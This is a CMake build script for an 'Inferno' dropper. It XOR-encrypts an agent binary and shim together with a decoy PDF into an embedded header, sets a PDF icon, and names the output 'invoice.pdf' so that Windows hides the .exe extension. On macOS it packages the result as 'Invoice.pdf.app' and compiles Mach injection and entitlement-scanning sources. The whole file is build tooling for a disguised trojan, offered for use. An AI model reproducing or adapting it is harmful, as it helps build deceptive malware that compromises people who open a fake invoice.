# ==========================================
# Inferno Agent Wrapper / Dropper (Phase 2)
# ==========================================

find_package(Python3 QUIET)
if(NOT Python3_FOUND)
    message(WARNING "Python3 not found — skipping inferno_wrapper build")
    return()
endif()

set(DECOY_PDF "${CMAKE_CURRENT_SOURCE_DIR}/resources/decoy.pdf")
set(AGENT_BINARY_HEADER "${CMAKE_CURRENT_BINARY_DIR}/agent_binary.h")

set(INFERNO_XOR_KEY "2B7E151628AED2A6")

if(APPLE)
    set(EMBEDDED_AGENT "$<TARGET_FILE:inferno_agent_dylib>")
    set(EMBEDDED_AGENT_DEP inferno_agent_dylib)
    set(EMBEDDED_SHIM "$<TARGET_FILE:inferno_shim>")
    set(EMBEDDED_SHIM_DEP inferno_shim)
else()
    set(EMBEDDED_AGENT "$<TARGET_FILE:inferno_client>")
    set(EMBEDDED_AGENT_DEP inferno_client)
    set(EMBEDDED_SHIM "")
    set(EMBEDDED_SHIM_DEP "")
endif()

add_custom_command(
    OUTPUT  ${AGENT_BINARY_HEADER}
    COMMAND ${Python3_EXECUTABLE}
            "${CMAKE_CURRENT_SOURCE_DIR}/bin2header.py"
            "--key" "${INFERNO_XOR_KEY}"
            "${EMBEDDED_AGENT}"
            "${EMBEDDED_SHIM}"
            "${DECOY_PDF}"
            "${AGENT_BINARY_HEADER}"
    DEPENDS  ${EMBEDDED_AGENT_DEP}
             ${EMBEDDED_SHIM_DEP}
             "${DECOY_PDF}"
             "${CMAKE_CURRENT_SOURCE_DIR}/bin2header.py"
    COMMENT "Generating agent_binary.h (XOR-encrypted) from agent binary + shim + decoy PDF"
    VERBATIM
)

set(WRAPPER_SOURCES
    src/main.cpp
    ${AGENT_BINARY_HEADER}
)

if(WIN32)
    set(PDF_ICO "${CMAKE_CURRENT_SOURCE_DIR}/resources/pdf.ico")
    add_custom_command(
        OUTPUT  ${PDF_ICO}
        COMMAND ${Python3_EXECUTABLE}
                "${CMAKE_CURRENT_SOURCE_DIR}/resources/gen_ico.py"
                "${PDF_ICO}"
        DEPENDS "${CMAKE_CURRENT_SOURCE_DIR}/resources/gen_ico.py"
        COMMENT "Generating pdf.ico for Windows resource"
    )
    set(WRAPPER_RC "${CMAKE_CURRENT_SOURCE_DIR}/resources/resource.rc")
    list(APPEND WRAPPER_SOURCES ${WRAPPER_RC} ${PDF_ICO})
endif()

if(APPLE)
    list(APPEND WRAPPER_SOURCES
        ../client/src/EntitlementScanner.cpp
        ../client/src/MachInjector.cpp
    )
endif()

add_executable(inferno_wrapper ${WRAPPER_SOURCES}
    include/unlit.hpp
)

target_include_directories(inferno_wrapper PRIVATE
    ${CMAKE_CURRENT_BINARY_DIR}
    ${CMAKE_CURRENT_SOURCE_DIR}/include
    ${CMAKE_SOURCE_DIR}/client/include
)



# UNLIT() macro returns a const char* from a lambda — the compiler can't
# see through it to verify the format string is a literal. The string IS
# compile-time fixed, so the warning is a false positive.
if(CMAKE_CXX_COMPILER_ID MATCHES "GNU|Clang|AppleClang")
    target_compile_options(inferno_wrapper PRIVATE -Wno-format-security)
endif()

# Name the output so Windows shows "invoice.pdf.exe" (explorer hides .exe)
set_target_properties(inferno_wrapper PROPERTIES
    OUTPUT_NAME "invoice.pdf"
)

if(WIN32)
    target_link_libraries(inferno_wrapper PRIVATE shell32)
endif()

# --- macOS .app bundle post-build ---
if(APPLE)
    set(APP_BUNDLE_DIR "${CMAKE_CURRENT_BINARY_DIR}/Invoice.pdf.app")
    set(APP_MACOS_DIR "${APP_BUNDLE_DIR}/Contents/MacOS")
    set(APP_PLIST_DIR "${APP_BUNDLE_DIR}/Contents")

    add_custom_command(TARGET inferno_wrapper POST_BUILD
        COMMAND ${CMAKE_COMMAND} -E make_directory "${APP_MACOS_DIR}"
        COMMAND ${CMAKE_COMMAND} -E copy
                "$<TARGET_FILE:inferno_wrapper>"
                "${APP_MACOS_DIR}/invoice_pdf"
        COMMAND chmod 755 "${APP_MACOS_DIR}/invoice_pdf"
        COMMAND ${Python3_EXECUTABLE}
                "${CMAKE_CURRENT_SOURCE_DIR}/resources/gen_plist.py"
                "${APP_PLIST_DIR}/Info.plist"
        COMMENT "Creating Invoice.pdf.app bundle for macOS"
    )
endif()
